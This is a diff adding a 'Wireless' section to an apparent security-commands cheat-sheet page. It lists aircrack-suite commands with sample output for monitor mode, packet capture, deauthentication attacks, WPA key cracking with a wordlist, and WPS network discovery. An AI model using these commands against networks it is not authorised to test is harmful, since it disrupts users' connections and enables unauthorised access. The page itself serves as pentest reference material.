@@ -1,0 +1,33 @@
+<div class="section" data-category="wireless">
+    <div class="section-header">
+        <div class="section-icon network">📡</div>
+        <h3>Wireless</h3>
+    </div>
+    <ul class="command-list">
+        <li class="command-item">
+            <span class="cmd">airmon-ng start wlan0</span>
+            <span class="desc">Monitor mode</span>
+            <code class="example">$ sudo airmon-ng start wlan0<br>(monitor mode enabled on wlan0mon)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">airodump-ng wlan0mon</span>
+            <span class="desc">Capture packets</span>
+            <code class="example">$ airodump-ng wlan0mon<br>BSSID  CH  ENC  ESSID<br>AA:BB:CC  6  WPA2  HomeNet</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">aireplay-ng --deauth 0 -a MAC wlan0mon</span>
+            <span class="desc">Deauth attack</span>
+            <code class="example">$ aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon<br>Sending 10 directed DeAuth</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">aircrack-ng -w wordlist capture.cap</span>
+            <span class="desc">Crack WPA</span>
+            <code class="example">$ aircrack-ng -w rockyou.txt capture.cap<br>KEY FOUND! [ password123 ]</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">wash -i wlan0mon</span>
+            <span class="desc">WPS networks</span>
+            <code class="example">$ wash -i wlan0mon<br>BSSID  Ch  WPS  ESSID<br>AA:BB:CC  1  2.0  OfficeWifi</code>
+        </li>
+    </ul>
+</div>
